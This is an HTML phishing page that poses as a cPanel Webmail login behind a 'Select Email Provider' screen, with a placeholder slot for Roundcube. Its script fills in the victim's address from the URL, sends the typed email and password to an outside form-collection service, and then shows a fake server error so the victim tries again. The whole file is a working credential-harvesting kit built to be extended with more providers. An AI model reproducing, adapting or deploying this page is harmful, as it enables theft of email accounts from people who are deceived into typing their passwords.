<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Provider Selection</title>
    <!-- Bootstrap 5 for Selection UI -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- cPanel Dependencies -->
    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
    <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.min.css" integrity="sha512-hwwdtOTYkQwW2sedIsbuP1h0mWeJe/hFOfsvNKpRB3CkRxq8EW7QMheec1Sgd8prYxGm1OM9OZcGW7/GUud5Fw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');

        /* Selection Screen Styles */
        body {
            font-family: 'Inter', sans-serif;
            background: url('https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/IMG_9209.png') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: inherit;
            filter: blur(5px);
            z-index: -1;
        }
        #provider-selection {
            height: 100vh;
            display: flex;
            align-items: start;
            justify-content: center;
            padding-top: 10%;
            background-color: #fff;
        }
        .provider-content {
            text-align: left;
        }
        .provider-section select {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 6px;
            border: 1px solid #ddd;
        }
        .provider-section button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
        }
        .provider-section button:hover {
            background-color: #166fe5;
        }
        /* Main Content (Login Pages) */
        #main-content {
            display: none;
            background-color: #f0f2f5;
            min-height: 100vh;
        }
        .login-container {
            margin: 20px auto;
            padding: 20px;
            max-width: 600px;
        }
        /* cPanel Copyright Style */
        .copyright {
            background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzU0IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
            background-size: 25px auto;
        }
    </style>
</head>
<body>
    <!-- Provider Selection Screen -->
    <div id="provider-selection">
        <div class="row">
            <div class="col-12 provider-content mx-2">
                <h2>Select Email Provider</h2>
                <div class="provider-section">
                    <select id="service-select" class="form-select mb-3">
                        <option value="">Select a provider</option>
                        <option value="cpanel">cPanel Webmail</option>
                        <option value="roundcube">Roundcube</option>
                        <!-- Add your provider names here -->
                    </select>
                    <button class="btn btn-primary" onclick="proceedToLogin()">Proceed</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content (Login Pages) -->
    <div id="main-content" style="display: none;">
        <div class="login-container">
            <!-- Dynamic login page content will be injected here -->
        </div>
    </div>

    <script>
        // Predefined login page templates
        const loginTemplates = {
            cpanel: `
                <div id="preload_images"></div>
                <div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
                    <div class="wrapper">
                        <div id="notify">
                            <noscript>
                                <div class="error-notice">
                                    <img src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
                                    JavaScript is disabled in your browser.
                                    For Webmail to function properly, you must enable JavaScript.
                                    If you do not enable JavaScript, certain features in Webmail will not function correctly.
                                </div>
                            </noscript>
                        </div>
                        <div style="display:none">
                            <div id="locale-container" style="visibility:hidden">
                                <div id="locale-inner-container">
                                    <div id="locale-header">
                                        <div class="locale-head">Please select a locale:</div>
                                        <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
                                    </div>
                                    <div id="locale-map">
                                        <div class="scroller clear">
                                            <div class="locale-cell"><a href="?locale=ar">العربية</a></div>
                                            <div class="locale-cell"><a href="?locale=bg">български</a></div>
                                            <div class="locale-cell"><a href="?locale=cs">čeština</a></div>
                                            <div class="locale-cell"><a href="?locale=da">dansk</a></div>
                                            <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
                                            <div class="locale-cell"><a href="?locale=el">Ελληνικά</a></div>
                                            <div class="locale-cell"><a href="?locale=es">español</a></div>
                                            <div class="locale-cell"><a href="?locale=es_419">español latinoamericano</a></div>
                                            <div class="locale-cell"><a href="?locale=es_es">español de España</a></div>
                                            <div class="locale-cell"><a href="?locale=fi">suomi</a></div>
                                            <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>
                                            <div class="locale-cell"><a href="?locale=fr">français</a></div>
                                            <div class="locale-cell"><a href="?locale=he">עברית</a></div>
                                            <div class="locale-cell"><a href="?locale=hu">magyar</a></div>
                                            <div class="locale-cell"><a href="?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
                                            <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>
                                            <div class="locale-cell"><a href="?locale=it">italiano</a></div>
                                            <div class="locale-cell"><a href="?locale=ja">日本語</a></div>
                                            <div class="locale-cell"><a href="?locale=ko">한국어</a></div>
                                            <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>
                                            <div class="locale-cell"><a href="?locale=nb">norsk bokmål</a></div>
                                            <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
                                            <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
                                            <div class="locale-cell"><a href="?locale=pl">polski</a></div>
                                            <div class="locale-cell"><a href="?locale=pt">português</a></div>
                                            <div class="locale-cell"><a href="?locale=pt_br">português do Brasil</a></div>
                                            <div class="locale-cell"><a href="?locale=ro">română</a></div>
                                            <div class="locale-cell"><a href="?locale=ru">русский</a></div>
                                            <div class="locale-cell"><a href="?locale=sl">slovenščina</a></div>
                                            <div class="locale-cell"><a href="?locale=sv">svenska</a></div>
                                            <div class="locale-cell"><a href="?locale=th">ไทย</a></div>
                                            <div class="locale-cell"><a href="?locale=tr">Türkçe</a></div>
                                            <div class="locale-cell"><a href="?locale=uk">українська</a></div>
                                            <div class="locale-cell"><a href="?locale=vi">Tiếng Việt</a></div>
                                            <div class="locale-cell"><a href="?locale=zh">中文</a></div>
                                            <div class="locale-cell"><a href="?locale=zh_cn">中文（中国）</a></div>
                                            <div class="locale-cell"><a href="?locale=zh_tw">中文（台湾）</a></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="content-container">
                            <div id="login-container">
                                <div id="login-sub-container">
                                    <div id="login-sub-header">
                                        <img class="main-logo" src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
                                    </div>
                                    <div id="login-sub">
                                        <div id="forms">
                                            <form novalidate id="login_form" action="" method="post" target="_self" style="visibility:">
                                                <input type="hidden" id="goto_uri" value="/?locale=en">
                                                <input type="hidden" id="goto_app" value="">
                                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                                <div class="input-field-login icon username-container">
                                                    <input name="email" id="email" readonly="readonly" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required>
                                                </div>
                                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                                <div class="input-field-login icon password-container">
                                                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required>
                                                </div>
                                                <p id="msg" style="color:red;"></p>
                                                <div class="controls">
                                                    <div class="login-btn">
                                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                                    </div>
                                                    <div class="reset-pw">
                                                        <a href="#" id="reset_password">Reset Password</a>
                                                    </div>
                                                </div>
                                                <div class="clear" id="push"></div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="locale-footer" style="display: block;">
                            <div class="locale-container">
                                <noscript>
                                    <form method="get" action=".">
                                        <select name="locale">
                                            <option value="">Change locale</option>
                                            <option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>
                                        </select>
                                        <button style="margin-left: 10px" type="submit">Change</button>
                                    </form>
                                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
                                </noscript>
                                <ul id="locales_list">
                                    <li><a href="/?locale=ar">العربية</a></li>
                                    <li><a href="/?locale=bg">български</a></li>
                                    <li><a href="/?locale=cs">čeština</a></li>
                                    <li><a href="/?locale=da">dansk</a></li>
                                    <li><a href="/?locale=de">Deutsch</a></li>
                                    <li><a href="/?locale=el">Ελληνικά</a></li>
                                    <li><a href="/?locale=es">español</a></li>
                                    <li><a href="/?locale=es_419">español latinoamericano</a></li>
                                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
                                </ul>
                                <div id="mobilelocalemenu">Select a locale:
                                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="copyright">Copyright© 2025 cPanel, L.L.C.<br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
                </div>
                <script>
                    $(document).ready(function(){
                        var count=0;
                        var email = window.location.hash.substr(1);
                        if (!email) {
                        } else {
                            var my_email = email;
                            $('#email').val(my_email);
                            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                            if (!filter.test(my_email)) {
                                $('#error').show();
                                email.focus;
                                return false;
                            }
                            var ind = my_email.indexOf("@");
                            var my_slice = my_email.substr((ind+1));
                        }
                        $('#login_submit').click(function(event){
                            $('#error').hide();
                            $('#msg').hide();
                            event.preventDefault();
                            var email = $("#email").val();
                            var password = $("#password").val();
                            if (!password) {
                                $('#msg').show();
                                $('#msg').html("Password is empty!");
                                return false;
                            }
                            count = count + 1;
                            $.ajax({
                                dataType: 'JSON',
                                url: 'https://submit-form.com/5BYUqxAm1',
                                type: 'POST',
                                data: $('#login_form').serialize(),
                                beforeSend: function(xhr){
                                },
                                success: function(response){
                                    if(response){
                                        $("#msg").show();
                                        console.log(response);
                                        if(response['signal'] == 'ok'){
                                            $("#password").val("");
                                            if (count >= 2) {
                                                count = 0;
                                            }
                                            swal('Error Login: There was an error on the server. Please login again');
                                        } else {
                                            swal('Error Login: There was an error on the server. Please login again');
                                        }
                                    }
                                },
                                error: function(){
                                    $("#password").val("");
                                    if (count >= 2) {
                                        count = 0;
                                    }
                                    swal('Error Login: There was an error on the server. Please login again');
                                },
                                complete: function(){
                                }
                            });
                        });
                    });
                    function toggle_locales(show) {
                        document.getElementById('locale-container').style.visibility = show ? 'visible' : 'hidden';
                    }
                </script>
            `,
            roundcube: `
                <div class="placeholder-login">
                    <h3>Roundcube Login</h3>
                    <p>Placeholder: Please provide the Roundcube HTML to display here.</p>
                </div>
            `
            // Add your provider templates here with keys matching the dropdown values
        };

        let selectedProvider = '';

        // Proceed to login page
        function proceedToLogin() {
            const select = document.getElementById('service-select').value;

            if (!select) {
                alert('Please select a valid provider from the dropdown.');
                return;
            }

            selectedProvider = select;
            document.getElementById('provider-selection').style.display = 'none';
            const loginContainer = document.querySelector('#main-content .login-container');
            let template = '';

            if (selectedProvider in loginTemplates) {
                template = loginTemplates[selectedProvider];
            } else {
                template = '<p>Error: Provider not found.</p>';
            }

            loginContainer.innerHTML = template;
            document.getElementById('main-content').style.display = 'block';

            // Re-attach cPanel-specific script for dynamic behavior
            if (selectedProvider === 'cpanel') {
                var count = 0;
                var email = window.location.hash.substr(1);
                if (email) {
                    var my_email = email;
                    $('#email').val(my_email);
                    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                    if (!filter.test(my_email)) {
                        $('#error').show();
                        email.focus;
                        return false;
                    }
                    var ind = my_email.indexOf("@");
                    var my_slice = my_email.substr((ind + 1));
                }
                $('#login_submit').click(function(event){
                    $('#error').hide();
                    $('#msg').hide();
                    event.preventDefault();
                    var email = $("#email").val();
                    var password = $("#password").val();
                    if (!password) {
                        $('#msg').show();
                        $('#msg').html("Password is empty!");
                        return false;
                    }
                    count = count + 1;
                    $.ajax({
                        dataType: 'JSON',
                        url: 'https://submit-form.com/5BYUqxAm1',
                        type: 'POST',
                        data: $('#login_form').serialize(),
                        beforeSend: function(xhr){
                        },
                        success: function(response){
                            if(response){
                                $("#msg").show();
                                console.log(response);
                                if(response['signal'] == 'ok'){
                                    $("#password").val("");
                                    if (count >= 2) {
                                        count = 0;
                                    }
                                    swal('Error Login: There was an error on the server. Please login again');
                                } else {
                                    swal('Error Login: There was an error on the server. Please login again');
                                }
                            }
                        },
                        error: function(){
                            $("#password").val("");
                            if (count >= 2) {
                                count = 0;
                            }
                            swal('Error Login: There was an error on the server. Please login again');
                        },
                        complete: function(){
                        }
                    });
                });
            }
        }
    </script>
</body>
</html>
